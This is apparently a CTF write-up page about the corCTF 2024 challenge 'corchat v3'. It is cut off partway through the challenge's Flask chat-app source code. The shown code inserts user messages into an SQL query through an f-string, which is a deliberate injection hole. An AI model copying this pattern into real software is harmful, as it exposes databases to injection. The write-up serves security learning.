<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-ctf-writeups/corctf-2024/corchat-v3" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">corchat v3 | Pwn Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://0xa5h.com/ctf-writeups/corctf-2024/corchat-v3"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="corchat v3 | Pwn Notes"><meta data-rh="true" name="description" content=" "><meta data-rh="true" property="og:description" content=" "><link data-rh="true" rel="icon" href="/img/sunglas.png"><link data-rh="true" rel="canonical" href="https://0xa5h.com/ctf-writeups/corctf-2024/corchat-v3"><link data-rh="true" rel="alternate" href="https://0xa5h.com/ctf-writeups/corctf-2024/corchat-v3" hreflang="en"><link data-rh="true" rel="alternate" href="https://0xa5h.com/ctf-writeups/corctf-2024/corchat-v3" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"CTF writeups","item":"https://0xa5h.com/category/ctf-writeups"},{"@type":"ListItem","position":2,"name":"corCTF 2024","item":"https://0xa5h.com/category/corctf-2024"},{"@type":"ListItem","position":3,"name":"corchat v3","item":"https://0xa5h.com/ctf-writeups/corctf-2024/corchat-v3"}]}</script><link rel="stylesheet" href="/assets/css/styles.985557f3.css">
<script src="/assets/js/runtime~main.90adf409.js" defer="defer"></script>
<script src="/assets/js/main.3a7a68fb.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/sunglas.png"><link rel="preload" as="image" href="/assets/image (156).png"><link rel="preload" as="image" href="/assets/corchat.gif"><link rel="preload" as="image" href="/assets/image (132).png"><link rel="preload" as="image" href="/assets/image (161).png"><link rel="preload" as="image" href="/assets/image (162).png"><link rel="preload" as="image" href="/assets/image (163).png"><link rel="preload" as="image" href="/assets/image (164).png"><link rel="preload" as="image" href="/assets/image (169).png"><link rel="preload" as="image" href="/assets/image (170).png"><link rel="preload" as="image" href="/assets/image (168).png"><link rel="preload" as="image" href="/assets/image (171).png"><link rel="preload" as="image" href="/assets/image (176).png"><link rel="preload" as="image" href="/assets/image (174).png"><link rel="preload" as="image" href="/assets/image (179).png"><link rel="preload" as="image" href="/assets/image (180).png"><link rel="preload" as="image" href="/assets/image (181).png"><link rel="preload" as="image" href="/assets/image (182).png"><link rel="preload" as="image" href="/assets/image (183).png"><link rel="preload" as="image" href="/assets/image (185).png"><link rel="preload" as="image" href="/assets/corchat_uaf.gif"><link rel="preload" as="image" href="/assets/image (186).png"><link rel="preload" as="image" href="/assets/image (187).png"><link rel="preload" as="image" href="/assets/image (188).png"><link rel="preload" as="image" href="/assets/image (189).png"><link rel="preload" as="image" href="/assets/image (191).png"><link rel="preload" as="image" href="/assets/image (192).png"><link rel="preload" as="image" href="/assets/image (193).png"><link rel="preload" as="image" href="/assets/image (194).png"><link rel="preload" as="image" href="/assets/image (195).png"><link rel="preload" as="image" href="/assets/image (196).png"><link rel="preload" as="image" href="/assets/image (197).png"><link rel="preload" as="image" href="/assets/image (198).png"><link rel="preload" as="image" href="/assets/image (199).png"><link rel="preload" as="image" href="/assets/image (200).png"><link rel="preload" as="image" href="/assets/image (202).png"><link rel="preload" as="image" href="/assets/image (203).png"><link rel="preload" as="image" href="/assets/image (205).png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/sunglas.png" alt="sunglas" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/sunglas.png" alt="sunglas" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Pwn Notes</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/">Notes</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/sasha-999" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/category/pwn">pwn</a><button aria-label="Expand sidebar category &#x27;pwn&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/category/ctf-writeups">CTF writeups</a><button aria-label="Collapse sidebar category &#x27;CTF writeups&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/category/htb-business-2024">HTB Business 2024</a><button aria-label="Expand sidebar category &#x27;HTB Business 2024&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/category/corctf-2024">corCTF 2024</a><button aria-label="Collapse sidebar category &#x27;corCTF 2024&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/ctf-writeups/corctf-2024/format-string">format-string</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/ctf-writeups/corctf-2024/corchat-v3">corchat v3</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/category/dicectf-2025">diceCTF 2025</a><button aria-label="Expand sidebar category &#x27;diceCTF 2025&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/category/test">Test</a><button aria-label="Expand sidebar category &#x27;Test&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/category/ctf-writeups"><span>CTF writeups</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/category/corctf-2024"><span>corCTF 2024</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">corchat v3</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>corchat v3</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<figure><img src="/assets/image (156).png" alt=""><figcaption></figcaption></figure>
<p><code>corchat v3</code> was one of the (many) brainfuck pwn challenges from this CTF, and was the challenge I focused on during the event (gotta get that $50). Unfortunately I didn&#x27;t solve it during the event, and someone beat me to it anyways. I did however manage to figure out most of how it worked after the event (with some reference to the author&#x27;s solution). Anways, let&#x27;s jump in.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="reversing">Reversing<a href="#reversing" class="hash-link" aria-label="Direct link to Reversing" title="Direct link to Reversing">​</a></h2>
<figure><img src="/assets/corchat.gif" alt=""><figcaption><p>The application</p></figcaption></figure>
<p>As the name implies, the target is a chatting application, which we&#x27;re given the following source code for:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> flask </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Flask</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> request</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> g</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> render_template</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> redirect</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> flask_socketio </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> SocketIO</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> sqlite3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">app </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Flask</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">__name__</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">socketio </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> SocketIO</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">app</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">app</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;DATABASE&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;chat.db&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">get_db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    db </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">getattr</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">g</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;_database&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> db </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">is</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        db </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> g</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">_database </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> sqlite3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">app</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;DATABASE&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> db</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@app</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">teardown_appcontext</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">close_connection</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">exception</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    db </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">getattr</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">g</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;_database&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> db </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">is</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">close</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@app</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">route</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;/&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">index</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> redirect</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;/chatroom&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@app</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">route</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;/chatroom&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> methods</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;GET&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">chatroom</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> render_template</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;chatroom.html&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@app</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">route</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;/send_message&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> methods</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;POST&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">post_new_message</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    message </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> request</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">form</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">get</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;msg&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> message </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">or</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">message</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;Invalid request&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    db </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> get_db</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    s </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;INSERT INTO messages (message) VALUES (&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">message</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 